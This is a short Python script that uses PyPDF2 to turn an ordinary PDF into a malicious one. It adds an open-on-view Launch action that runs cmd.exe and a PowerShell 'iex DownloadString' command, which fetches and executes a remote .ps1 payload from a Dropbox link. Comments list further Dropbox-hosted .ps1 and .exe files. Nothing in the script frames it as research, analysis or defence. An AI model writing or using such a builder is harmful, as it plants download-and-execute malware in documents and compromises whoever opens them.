import PyPDF2
from PyPDF2.generic import DictionaryObject, NameObject, TextStringObject

pdf_path = "output.pdf"
output_path = "modified.pdf"

reader = PyPDF2.PdfReader(open(pdf_path, "rb"))
writer = PyPDF2.PdfWriter()

for i in range(len(reader.pages)):
    writer.add_page(reader.pages[i])


# https://www.dropbox.com/scl/fi/f3k7xpydr6ci56gtvqo2x/teste.ps1?rlkey=msg6e1gnkbxl41eidbs1irmbw&st=naptj51l&dl=1
# https://www.dropbox.com/scl/fi/0d8qkntos3ha0t0tz7lzs/mom.ps1?rlkey=eln3escdv21sjt5a8res8ez1f&st=j811v9b7&dl=1
# https://www.dropbox.com/scl/fi/hlkcfmtehc6q1hv1ryhmu/pp.exe?rlkey=qbcmm8mdvjltaiaurrdhdgo5c&st=f6lj2261&dl=1
# https://www.dropbox.com/scl/fi/qtxtt8uxz7z6w664k99rj/dd.ps1?rlkey=lhezztos2n62hos252yo4sekw&st=3eiqhj0y&dl=1 -> dd

url = "https://www.dropbox.com/scl/fi/qtxtt8uxz7z6w664k99rj/dd.ps1?rlkey=lhezztos2n62hos252yo4sekw&st=3eiqhj0y&dl=1"
win_dict = DictionaryObject()
win_dict.update({
    NameObject("/F"): TextStringObject("cmd.exe"),
    NameObject("/P"): TextStringObject(f'/c powershell -Command "iex (New-Object Net.WebClient).DownloadString(\'{url}\')"')
})

launch_action = DictionaryObject()
launch_action.update({
    NameObject("/S"): NameObject("/Launch"),
    NameObject("/Win"): win_dict
})

writer._root_object.update({
    NameObject("/OpenAction"): launch_action
})

with open(output_path, "wb") as output_pdf:
    writer.write(output_pdf)

print(f"PDF modified and saved as '{output_path}'")
